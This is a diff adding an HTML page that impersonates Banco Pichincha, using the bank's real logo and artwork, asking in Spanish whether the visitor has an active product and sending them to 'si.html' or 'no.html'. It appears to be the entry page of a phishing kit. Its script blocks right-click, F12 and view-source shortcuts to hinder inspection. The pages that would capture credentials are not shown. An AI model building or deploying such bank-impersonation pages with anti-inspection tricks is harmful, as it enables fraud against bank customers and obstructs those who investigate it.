@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Banco Pichincha</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#ffffff;
+    color:#1a1a1a;
+}
+
+/* HEADER */
+.header{
+    padding:16px;
+    box-shadow:0 2px 6px rgba(0,0,0,.15);
+}
+
+.logo{
+    height:36px;
+}
+
+/* CONTENIDO */
+.container{
+    padding:30px 20px 50px;
+    text-align:center;
+}
+
+.image-box{
+    margin:40px auto 30px;
+    max-width:280px;
+}
+
+.image-box img{
+    width:100%;
+    height:auto;
+}
+
+/* TEXTOS */
+.title{
+    font-size:26px;
+    font-weight:bold;
+    color:#0b2a5b;
+    margin-bottom:12px;
+}
+
+.description{
+    font-size:16px;
+    color:#555;
+    line-height:1.5;
+    margin-bottom:40px;
+}
+
+/* BOTONES */
+.buttons{
+    display:flex;
+    gap:15px;
+    justify-content:center;
+    flex-wrap:wrap;
+}
+
+.btn{
+    flex:1;
+    max-width:180px;
+    padding:16px;
+    font-size:16px;
+    font-weight:bold;
+    border-radius:6px;
+    cursor:pointer;
+    border:none;
+}
+
+.btn-yes{
+    background:#ffd200;
+}
+
+.btn-yes:hover{
+    background:#f5c400;
+}
+
+.btn-no{
+    background:#e6e6e6;
+    color:#333;
+}
+
+.btn-no:hover{
+    background:#dcdcdc;
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" class="logo" alt="Banco Pichincha">
+</div>
+
+<!-- CONTENIDO -->
+<div class="container">
+
+    <!-- IMAGEN -->
+    <div class="image-box">
+        <img src="https://www.pichincha.com/sites/default/files/images/beneficio%2B1-plazodolar-renovacion-automatica_8.svg" alt="Ilustración">
+    </div>
+
+    <div class="title">
+        Antes de continuar
+    </div>
+
+    <div class="description">
+        ¿Tiene un producto activo con nosotros?
+    </div>
+
+    <div class="buttons">
+        <button class="btn btn-yes">Sí</button>
+        <button class="btn btn-no">No</button>
+    </div>
+
+</div>
+    <script>
+    // 1. Bloqueo de inspección (Evita F12, Ctrl+U, Clic Derecho)
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = e => {
+        if (e.keyCode == 123 || 
+            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || 
+            (e.ctrlKey && e.keyCode == 85)) {
+            return false;
+        }
+    };
+
+    // 2. Lógica de los botones
+    // Botón "Sí" -> Redirecciona a si.html
+    document.querySelector('.btn-yes').addEventListener('click', function() {
+        window.location.href = "si.html";
+    });
+
+    // Botón "No" -> Redirecciona a no.html
+    document.querySelector('.btn-no').addEventListener('click', function() {
+        window.location.href = "no.html";
+    });
+    </script>
+</body>
+</html>
